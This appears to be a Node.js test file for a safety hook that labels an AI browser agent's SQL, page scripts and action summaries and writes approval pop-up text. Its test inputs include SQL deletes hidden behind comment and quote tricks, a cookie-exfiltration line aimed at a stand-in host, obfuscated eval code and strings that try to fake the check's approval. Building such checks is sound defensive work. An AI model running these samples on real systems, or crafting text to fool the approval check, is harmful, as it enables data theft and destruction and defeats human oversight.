// GEN-953 step 2 tests: the plain-words pop-up text of the browser gate working copy.
// Unit tests on the labels and the text, plus end-to-end runs of the real hook process (stdin JSON,
// temporary state and log), comparing the decision with the live hook.
// Usage: node tests.js
'use strict';
const fs = require('fs'), os = require('os'), path = require('path'), cp = require('child_process');
const WC = path.join(__dirname, 'wc', 'browser-site-gate.js');
const LIVE = path.join(process.env.USERPROFILE, '.claude', 'hooks', 'browser-site-gate.js');
const W = require(WC);
let pass = 0, fail = 0;
const ok = (name, cond, extra) => { if (cond) pass++; else { fail++; console.log('FAIL', name, extra === undefined ? '' : JSON.stringify(extra).slice(0, 300)); } };
// sqlKind names every kind found, worst first; the label tests below check the worst (first) one.
const sqlAll = W.sqlKind;
const SQL_LABELS = ['deletes data or database objects', 'changes who has access', 'copies data to or from storage outside the database, which can send data out',
  'replaces or changes live tables, views or code', 'runs a saved database program, which can change anything', 'adds or changes data', 'creates a new database object'];
W.sqlKind = t => { const r = sqlAll(t); return r && (SQL_LABELS.find(l => r.startsWith(l)) || r); };
const typed = t => [{ kind: 'typed', text: t }];
const script = t => [{ kind: 'script', text: t }];

// --- SQL labels (worst first, comments and string values set aside)
ok('sql drop', W.sqlKind(typed('DROP TABLE t')) === 'deletes data or database objects');
ok('sql delete', W.sqlKind(typed('delete from x where 1=1')) === 'deletes data or database objects');
ok('sql truncate', W.sqlKind(typed('TRUNCATE TABLE a')) === 'deletes data or database objects');
ok('sql remove stage', W.sqlKind(typed('REMOVE @mystage/x')) === 'deletes data or database objects');
ok('sql create or replace', W.sqlKind(typed('CREATE OR REPLACE PROCEDURE p() ...')) === 'replaces or changes live tables, views or code');
ok('sql alter table', W.sqlKind(typed('alter table t add column c int')) === 'replaces or changes live tables, views or code');
ok('sql grant', W.sqlKind(typed('GRANT SELECT ON t TO ROLE r')) === 'changes who has access');
ok('sql revoke', W.sqlKind(typed('revoke usage on db d from role r')) === 'changes who has access');
ok('sql create user', W.sqlKind(typed('CREATE USER bob')) === 'changes who has access');
ok('sql call', W.sqlKind(typed('CALL my_proc(1)')) === 'runs a saved database program, which can change anything');
ok('sql system$', W.sqlKind(typed('select system$cancel_query(1)')) === 'runs a saved database program, which can change anything');
ok('sql comment marker in a string hides nothing', W.sqlKind(typed("insert into t values ('--'); drop table t; select '--'")) === 'deletes data or database objects');
ok('sql block comment marker in a string hides nothing', W.sqlKind(typed("insert into t values ('/*'); drop table t; select '*/'")) === 'deletes data or database objects');
ok('sql backslash quote hides nothing', W.sqlKind(typed("insert into t values ('a\\'b'); drop table x; select 'c'")) === 'deletes data or database objects');
ok('sql dash-dash inside a value hides nothing', W.sqlKind(typed("insert into t values ('a--b'); drop table t")) === 'deletes data or database objects');
ok('sql quote in a comment hides nothing', W.sqlKind(typed("-- it's here\ninsert into t values (1); drop table t -- '")) === 'deletes data or database objects');
ok('sql insert', W.sqlKind(typed('INSERT INTO t VALUES (1)')) === 'adds or changes data');
ok('sql update', W.sqlKind(typed('update t set a = 1')) === 'adds or changes data');
ok('sql update alias', W.sqlKind(typed('UPDATE t AS x SET a = 1')) === 'adds or changes data');
ok('sql merge', W.sqlKind(typed('merge into t using s on ...')) === 'adds or changes data');
ok('sql create or replace user is access', W.sqlKind(typed('CREATE OR REPLACE USER bob')) === 'changes who has access');
ok('sql alter share is access', W.sqlKind(typed('ALTER SHARE s ADD ACCOUNTS = x')) === 'changes who has access');
ok('sql copy into stage', W.sqlKind(typed('COPY INTO @ext_stage/out FROM t')) === 'copies data to or from storage outside the database, which can send data out');
ok('sql copy into table', W.sqlKind(typed('COPY INTO t FROM @s')) === 'adds or changes data');
ok('sql unclosed backslash quotes are fast', (() => { const t0 = Date.now(); W.sqlKind(typed("drop table x; '" + "\\'".repeat(10000))); return Date.now() - t0 < 300; })());
ok('sql stray apostrophe hides nothing', W.sqlKind(typed("insert into t values ('it's'); drop table x")) === 'deletes data or database objects');
ok('sql closed values still set aside', W.sqlKind(typed("select 'a' as x, 'drop table y' as z")) === null);
ok('sql create table', W.sqlKind(typed('create table t (a int)')) === 'creates a new database object');
ok('sql worst wins (select then drop)', W.sqlKind(typed('SELECT 1; DROP TABLE t')) === 'deletes data or database objects');
ok('sql worst wins (insert then grant)', W.sqlKind(typed('insert into t values(1); grant select on t to role r')) === 'changes who has access');
ok('sql comment with a write is still named (MySQL may run it)', W.sqlKind(typed('-- drop table t\nselect 1')) === 'deletes data or database objects');
ok('sql block comment with a write is still named', W.sqlKind(typed('/* create or replace */ select 1')) === 'replaces or changes live tables, views or code');
ok('sql mysql 1--1 hides nothing', /deletes data or database objects/.test(W.sqlKind(typed('INSERT INTO audit VALUES (1--1); DROP TABLE users'))));
ok('sql mysql run-anyway comment hides nothing', /deletes data or database objects/.test(W.sqlKind(typed('INSERT INTO a VALUES (1); /*!50000 DROP TABLE users */'))));
ok('sql every kind named', sqlAll(typed('DELETE FROM tmp_x; GRANT OWNERSHIP ON DATABASE prod TO ROLE public')) === 'deletes data or database objects and changes who has access');
ok('sql comment inside keyword still found', W.sqlKind(typed('DELETE/**/FROM t')) === 'deletes data or database objects');
ok('sql string value set aside', W.sqlKind(typed("select * from h where q ilike 'create or replace procedure%'")) === null);
ok('sql doubled quote in value', W.sqlKind(typed("select 'it''s drop table x' as a")) === null);
ok('sql use role is not a change', W.sqlKind(typed('USE ROLE ACCOUNTADMIN')) === null);
ok('sql read', W.sqlKind(typed('SELECT * FROM t')) === null);
ok('sql case-insensitive', W.sqlKind(typed('Drop View v')) === 'deletes data or database objects');
ok('sql in script quotes only', W.sqlKind(script('run("DROP TABLE t")')) === 'deletes data or database objects');
ok('sql js delete is not sql', W.sqlKind(script('delete obj.x; const update = 1;')) === null);
ok('sql empty', W.sqlKind([]) === null && W.sqlKind(undefined) === null);

// --- script labels
const sk = t => W.scriptKinds(script(t));
ok('js fetch', sk('fetch("/api")')[0] === 'sends data from the page to a server');
ok('js click', sk('document.querySelector("b").click()')[0] === 'clicks, submits or presses things on the page');
ok('js navigate', sk('location.assign("/x")')[0] === 'moves the page to another address');
ok('js storage', sk('localStorage.setItem("a","b")')[0] === "changes the site's data saved on this computer");
ok('js edit', sk('el.value = "x"')[0] === 'changes what is on the page or in a form');
ok('js hidden', sk('eval(atob("Zm9v"))')[0] === 'runs code that is hidden or hard to read');
ok('js two kinds in order', JSON.stringify(sk('el.click(); fetch("/x")')) === JSON.stringify(['sends data from the page to a server', 'clicks, submits or presses things on the page']));
ok('js jquery ajax sends', sk('$.ajax({url:"/x"}); el.value = 1')[0] === 'sends data from the page to a server');
ok('js xhr.open is not moving the page', JSON.stringify(sk('const x=new XMLHttpRequest(); x.open("GET","/a"); x.send()')) === JSON.stringify(['sends data from the page to a server']));
ok('js window.open moves the page', sk('window.open("/x")')[0] === 'moves the page to another address');
ok('js bare open moves the page', sk('open("/x")')[0] === 'moves the page to another address');
ok('js location.href moves and may send', JSON.stringify(sk('window.location.href = "https://o.example/?d=" + x')) === JSON.stringify(['sends data from the page to a server', 'moves the page to another address', 'changes what is on the page or in a form']));
ok('js image src may send', sk('new Image().src = "https://a.example/?c=" + document.cookie').includes('sends data from the page to a server'));
ok('js bracket-built call is hidden code, named first', sk('el.value="x"; window["fe"+"tch"]("https://a.example")')[0] === 'runs code that is hidden or hard to read');
ok('js hidden code named first', sk('b.click(); i.value=1; eval(atob("eA=="))')[0] === 'runs code that is hidden or hard to read');
ok('js unknown risky -> none', sk('window.foo = 1').length === 0);
ok('js typed text ignored', W.scriptKinds(typed('fetch(')).length === 0);

// --- word labels
ok('word delete', W.wordKind('Clicks Delete for the ticked user') === 'delete or remove something');
ok('word remove access -> delete first', W.wordKind('Clicks Remove access on the row') === 'delete or remove something');
ok('word money', W.wordKind('Pays the invoice') === 'spend money or change a plan');
ok('word billing', W.wordKind('Opens Admin Billing') === 'spend money or change a plan');
ok('word send', W.wordKind('Sends the drafted reply') === 'send, post or publish something');
ok('word share', W.wordKind('Shares the file with anyone') === 'share something or change who can see it');
ok('word access', W.wordKind('Opens the Change Owner dialog') === 'change who has access');
ok('word upload', W.wordKind('Uploads the logo') === 'upload a file');
ok('word confirm', W.wordKind('Confirms the dialog') === 'accept, confirm or approve something');
ok('word hebrew delete', W.wordKind('מוחק את הקובץ') === 'delete or remove something');
ok('word read-only summary gets no danger label', W.wordKind('Runs the read-only grants snapshot query') === null);
ok('word orders tab is not money', W.wordKind('Clicks the Orders tab') === null);
ok('word places an order is money', W.wordKind('Places the order') === 'spend money or change a plan');
ok('word private channel is not sharing', W.wordKind('Opens the private channel') === null);
ok('word plain select -> none', W.wordKind('Selects the Muuula developer account') === null);

// --- whole text
const res = o => Object.assign({ decision: 'ask', causes: [], hosts: [], notes: [], texts: [], claims: [], where: [] }, o);
let t = W.plainReason(res({ causes: ['new-site'], hosts: ['example.com'], notes: ['example.com'] }));
ok('new-site names site once, no undo note', /^First action on example\.com this session\./.test(t) && !/Site:/.test(t) && !/Undo/.test(t) && /\(browser safety check\)$/.test(t), t);
t = W.plainReason(res({ causes: ['typed-write'], notes: ['app.snowflake.com'], texts: typed('CREATE OR REPLACE PROCEDURE x()'), claims: ['Types the routine'], where: ['app.snowflake.com'] }));
ok('typed write card', t.startsWith('Typing a database command that replaces or changes live tables, views or code. Site: app.snowflake.com. Claude says: "Types the routine". Undo is not guaranteed. Allow only if this matches what Claude told you it would do.'), t);
t = W.plainReason(res({ causes: ['typed-write'], texts: typed("select 'drop table x'") }));
ok('typed write unknown kind is honest', /Typing a database command that the check cannot confirm only reads data\./.test(t), t);
t = W.plainReason(res({ causes: ['word'], notes: ['"Selects the account"'], claims: ['Selects the account'], where: ['play.google.com'] }));
ok('word card: Claude first', t.startsWith('Claude says: "Selects the account". The check cannot confirm this only looks at the page. Site: play.google.com. Undo is not guaranteed.') && (t.match(/Claude says/g) || []).length === 1, t);
t = W.plainReason(res({ causes: ['word'], notes: ['"Deletes the draft"'], claims: ['Deletes the draft'], where: ['a.com'] }));
ok('word card with danger kind', t.startsWith('This may delete or remove something. Site: a.com. Claude says: "Deletes the draft".'), t);
t = W.plainReason(res({ causes: ['typed-write'], texts: [{ kind: 'typed', text: 'insert into t values (1)', cut: true }] }));
ok('cut text never names a milder kind', /too long for the check to read in full, so it can change anything/.test(t) && !/adds or changes data/.test(t), t);
t = W.plainReason(res({ causes: ['risky-script'], texts: [{ kind: 'script', text: 'el.click()', cut: true }] }));
ok('cut script says so', /, and more the check could not read\./.test(t), t);
t = W.plainReason(res({ causes: ['high-stakes'], notes: ['mail.google.com'], claims: ['Opens the draft'], where: ['mail.google.com'] }));
ok('high-stakes card shows Claude summary', /^mail\.google\.com is a sensitive site/.test(t) && /Claude says: "Opens the draft"/.test(t) && !/Site:/.test(t), t);
t = W.plainReason(res({ causes: ['helper-args', 'typed-write'], notes: ['app.snowflake.com'], texts: script('h("GRANT x TO ROLE r")') }));
ok('helper-args with typed-write names kind once', (t.match(/changes who has access/g) || []).length === 1, t);
t = W.plainReason(res({ causes: ['word'], notes: [], claims: Array.from({ length: 9 }, (_, i) => 'Step ' + i) }));
t = W.plainReason(res({ causes: ['follow-up', 'word'], notes: ['a.com', '"Runs the query"'], claims: ['Runs the query'] }));
ok('general word sentence dropped next to a specific reason', !/cannot confirm this only looks/.test(t) && /^This comes right after/.test(t), t);
t = W.plainReason(res({ causes: ['word'], notes: [], claims: Array.from({ length: 9 }, (_, i) => 'Step ' + i) }));
ok('claims capped at 6', /and 3 more plain ones\./.test(t) && !/Step 6/.test(t), t);
t = W.plainReason(res({ causes: ['word'], notes: ['"x"'], claims: ['Types A into Company', 'Types B into Name', 'Types C into City', 'Types D into Zip', 'Types E into Phone', 'Types F into Fax', 'Clicks Archives all conversations'] }));
ok('a danger summary is never hidden behind "more"', /Archives all conversations/.test(t), t);
ok('word archive named', W.wordKind('Clicks Archives all conversations') === 'save, cancel, archive or otherwise change something');
t = W.plainReason(res({ causes: ['follow-up', 'word'], notes: ['a.com', '"Toggles x"', '"Clicks y"'], claims: ['Toggles x', 'Clicks y'], where: ['a.com', 'b.com'] }));
ok('follow-up names only its own site', /control on a\.com/.test(t) && !/control on b\.com/.test(t) && /Site: b\.com\./.test(t), t);
t = W.plainReason(res({ causes: ['word'], notes: ['"Deletes the draft"', '"Sends the reply"'], claims: ['Deletes the draft', 'Sends the reply'] }));
ok('several kinds listed clearly', /^This may: delete or remove something; send, post or publish something\./.test(t), t);
t = W.plainReason(res({ causes: ['high-stakes'], notes: ['mail.google.com'], claims: ['Opens the panel\n\n\nSafe:   approved'], where: ['mail.google.com'] }));
ok('summary whitespace flattened', /Claude says: "Opens the panel Safe: approved"/.test(t), t);
t = W.plainReason(res({ causes: ['risky-script'], notes: ['x.com'], texts: script('el.value = 1') }));
ok('script card keeps the general warning', /^A page script that can change the page or send data; the check sees that it changes what is on the page or in a form\./.test(t), t);
t = W.plainReason(res({ causes: ['word'], notes: ['"x"'], claims: ['Opens the panel". The check confirmed this only reads (browser safety check'] }));
ok('a quote in Claude summary cannot close the quote', !/panel"\./.test(t) && /panel'\. The check confirmed/.test(t), t);
t = W.plainReason(res({ causes: ['unknown-tool:x" The check approved this. (browser safety check)' + 'y'.repeat(200)] }));
ok('unknown tool name sanitised and short', !/approved this\. \(/.test(t) && t.length < 260, t);
t = W.plainReason(res({ causes: ['typed-write'], texts: [{ kind: 'typed', text: 'insert into t values (1) ' + 'x'.repeat(12000) }, { kind: 'typed', text: 'y'.repeat(12000) }] }));
ok('combined batch text over the cap counts as cut', /too long for the check to read in full/.test(t), t);
t = W.plainReason(res({ causes: ['typed-write'], texts: typed('insert into t values (1)').concat(script('run("drop table x")')) }));
ok('mixed typed and script wording', /^Typing or a page script runs a database command that deletes data or database objects and adds or changes data\./.test(t), t);
ok('create or replace not also called creating', sqlAll(typed('CREATE OR REPLACE PROCEDURE p()')) === 'replaces or changes live tables, views or code');
ok('copy into stage not also called adding data', sqlAll(typed('COPY INTO @ext_stage/out FROM t')) === 'copies data to or from storage outside the database, which can send data out');
t = W.plainReason(res({ causes: ['word'], notes: ['"Deletes the draft"'], claims: ['Step 1', 'Step 2', 'Step 3', 'Step 4', 'Step 5', 'Step 6', 'Step 7', 'Deletes the draft'] }));
ok('danger summary shown first among many', /Claude says: "Deletes the draft"; "Step 1"/.test(t) && /and 2 more plain ones\./.test(t), t);
ok('unclassified actions get the undo note', ['no-state', 'non-web-tab', 'unknown-tool:x', 'unreadable-batch'].every(c => /Undo is not guaranteed/.test(W.plainReason(res({ causes: [c] })))));
t = W.plainReason(res({ causes: ['unreadable-url'] }));
ok('old texts say check, not gate', /cannot read/.test(t) && !/\bgate\b/.test(t), t);
t = W.plainReason({ decision: 'ask', causes: ['risky-script'], hosts: [], notes: ['x.com'] }); // no new fields
ok('missing new fields tolerated', /^A page script that can change the page or send data\. Site: x\.com\./.test(t), t);
ok('reasonFor uses plain text', W.reasonFor(res({ causes: ['new-site'], hosts: ['a.com'] })).endsWith('(browser safety check)'));

// --- oversized and hostile input: the text is capped and built quickly
const big = 'update ' + 'a'.repeat(50000) + ' x';
let t0 = Date.now(); W.sqlKind(typed(big.slice(0, 20000))); W.sqlKind(script('"' + "'".repeat(20000)));
W.scriptKinds(script('('.repeat(20000))); W.wordKind('x'.repeat(5000));
ok('fast on hostile input', Date.now() - t0 < 500, Date.now() - t0);

// --- decide carries the texts, capped; nothing new is saved in the state
const st = W.newState(); st.approved['app.snowflake.com'] = true; st.tabs['1'] = { url: 'https://app.snowflake.com/x', stale: false, taint: false };
const r1 = W.decide(st, 'mcp__claude-in-chrome__computer', { action: 'type', tabId: 1, text: 'DROP TABLE t ' + 'x'.repeat(30000), action_summary: 'Types the query' }, {});
ok('decide keeps typed text capped and marks the cut', r1.decision === 'ask' && r1.texts.length === 1 && r1.texts[0].text.length === 20000 && r1.texts[0].cut === true && r1.claims[0] === 'Types the query', { d: r1.decision, n: r1.texts.length });
ok('capped typed write card', /too long for the check to read in full/.test(W.plainReason(r1)));
W.countCall(st, r1); W.applyDecision(st, r1);
ok('state holds no texts or claims', !/DROP TABLE|Types the query/.test(JSON.stringify(st)));

// --- end to end through the real hook process, live vs working copy
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'gen953-e2e-'));
function run(hook, tag, payload) {
  const env = Object.assign({}, process.env, { BROWSER_GATE_STATE_DIR: path.join(tmp, tag, 'state'), BROWSER_GATE_LOG: path.join(tmp, tag, 'log.jsonl') });
  fs.mkdirSync(path.join(tmp, tag), { recursive: true });
  const r = cp.spawnSync(process.execPath, [hook], { input: JSON.stringify(payload), env, encoding: 'utf8', timeout: 20000 });
  return { code: r.status, out: r.stdout ? JSON.parse(r.stdout) : null };
}
const steps = [
  { hook_event_name: 'PreToolUse', session_id: 's1', tool_use_id: 'u1', tool_name: 'mcp__claude-in-chrome__navigate', tool_input: { tabId: 7, url: 'https://app.snowflake.com/w' } },
  { hook_event_name: 'PostToolUse', session_id: 's1', tool_use_id: 'u1', tool_name: 'mcp__claude-in-chrome__navigate', tool_input: { tabId: 7, url: 'https://app.snowflake.com/w' }, tool_response: 'ok' },
  { hook_event_name: 'PostToolUse', session_id: 's1', tool_use_id: 'u2', tool_name: 'mcp__claude-in-chrome__tabs_context_mcp', tool_input: {}, tool_response: 'Tab Context:\n- Available tabs:\n  • tabId 7: "W" ("https://app.snowflake.com/w")' },
  { hook_event_name: 'PreToolUse', session_id: 's1', tool_use_id: 'u3', tool_name: 'mcp__claude-in-chrome__computer', tool_input: { tabId: 7, action: 'type', text: 'CREATE OR REPLACE PROCEDURE p() RETURNS INT', action_summary: 'Types the reviewed routine' } },
  { hook_event_name: 'PreToolUse', session_id: 's1', tool_use_id: 'u4', tool_name: 'mcp__claude-in-chrome__javascript_tool', tool_input: { tabId: 7, action: 'javascript_exec', text: 'fetch("/api/x", {method:"POST"})' } }
];
const outs = { live: [], wc: [] };
for (const p of steps) { outs.live.push(run(LIVE, 'live', p)); outs.wc.push(run(WC, 'wc', p)); }
for (let i = 0; i < steps.length; i++) {
  const a = outs.live[i], b = outs.wc[i];
  const dec = o => o.out && o.out.hookSpecificOutput ? o.out.hookSpecificOutput.permissionDecision : 'none';
  ok('e2e step ' + i + ' same decision and exit', a.code === b.code && dec(a) === dec(b), { a: dec(a), b: dec(b), ca: a.code, cb: b.code });
}
const reason = i => outs.wc[i].out.hookSpecificOutput.permissionDecisionReason;
ok('e2e navigate asks new-site', /^First action on app\.snowflake\.com/.test(reason(0)), reason(0));
ok('e2e typed routine card', /^Typing a database command that replaces or changes live tables, views or code\./.test(reason(3)) && /Claude says: "Types the reviewed routine"/.test(reason(3)), reason(3));
ok('e2e script card', /^A page script that can change the page or send data; the check sees that it sends data from the page to a server\. Site: app\.snowflake\.com\./.test(reason(4)), reason(4));
const strip = f => fs.readFileSync(f, 'utf8').split('\n').filter(Boolean).map(l => { const j = JSON.parse(l); delete j.ts; return JSON.stringify(j); }).join('\n');
ok('e2e logs identical', strip(path.join(tmp, 'live', 'log.jsonl')) === strip(path.join(tmp, 'wc', 'log.jsonl')));
fs.rmSync(tmp, { recursive: true, force: true });

console.log(pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
